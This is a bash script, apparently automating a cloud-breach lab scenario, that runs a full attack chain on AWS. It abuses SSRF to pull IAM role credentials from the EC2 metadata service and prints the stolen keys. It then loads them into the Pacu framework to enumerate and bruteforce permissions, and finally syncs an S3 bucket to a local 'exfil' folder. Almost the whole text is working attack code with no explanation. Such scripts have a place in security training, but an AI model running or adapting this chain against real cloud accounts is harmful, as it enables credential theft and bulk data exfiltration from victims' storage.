. ./cloud_breach_s3.config

echo 'ssrf attack'
ROLE=$(curl -s http://$IP_ADDRESS/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254')
sts_session=$(curl -s http://$IP_ADDRESS/latest/meta-data/iam/security-credentials/$ROLE -H 'Host:169.254.169.254')
sleep 5
echo 'ssrf attack complete'

export AWS_ACCESS_KEY_ID=$(jq -r '.AccessKeyId' <<< ${sts_session})
export AWS_SESSION_TOKEN=$(jq -r '.Token' <<< ${sts_session})
export AWS_SECRET_ACCESS_KEY=$(jq -r '.SecretAccessKey' <<< ${sts_session})
export AWS_REGION=us-east-1

echo
echo 
echo 'aws_access_key_id =' $AWS_ACCESS_KEY_ID
echo
echo 'aws_secret_access_key = ' $AWS_SECRET_ACCESS_KEY
echo
echo 'aws_session_token = ' $AWS_SESSION_TOKEN
echo

sleep 5
echo 'set aws environment variables'

echo 'set keys in pacu'

if [[ $(../pacu/cli.py --session cloud_breach_s3) == *"Session could not be found"* ]]; then
   ../pacu/cli.py --new-session cloud_breach_s3
fi

../pacu/cli.py --activate-session --session cloud_breach_s3
../pacu/cli.py --session cloud_breach_s3 --set-keys cloud_breach,$AWS_ACCESS_KEY_ID,$AWS_SECRET_ACCESS_KEY,$AWS_SESSION_TOKEN
../pacu/cli.py --session cloud_breach_s3 --whoami

timer=${RANDOM:0:1}
echo $(date -u)
sleep $timer
echo 'execute aws__enum_account'
../pacu/cli.py --session cloud_breach_s3 --exec --module-name aws__enum_account

timer=${RANDOM:0:1}
echo $(date -u)
sleep $timer
echo 'execute iam__enum_permissions'
../pacu/cli.py --session cloud_breach_s3 --exec --module-name iam__enum_permissions

timer=${RANDOM:0:1}
echo $(date -u)
sleep $timer
echo 'execute iam__enum_users_roles_policies_groups'
../pacu/cli.py --session cloud_breach_s3 --exec --module-name iam__enum_users_roles_policies_groups

timer=${RANDOM:0:1}
echo $(date -u)
sleep $timer
echo 'execute iam__bruteforce_permissions'
../pacu/cli.py --session cloud_breach_s3 --exec --module-name iam__bruteforce_permissions


timer=${RANDOM:0:1}
echo $(date -u)
sleep $timer
echo 'execute s3 discovery'
aws s3 ls

timer=${RANDOM:0:1}
echo $(date -u)
sleep $timer
echo 'execute s3 exfil'
aws s3 sync s3://$S3_BUCKET ./cloud_breach_s3_exfil

#DONE!
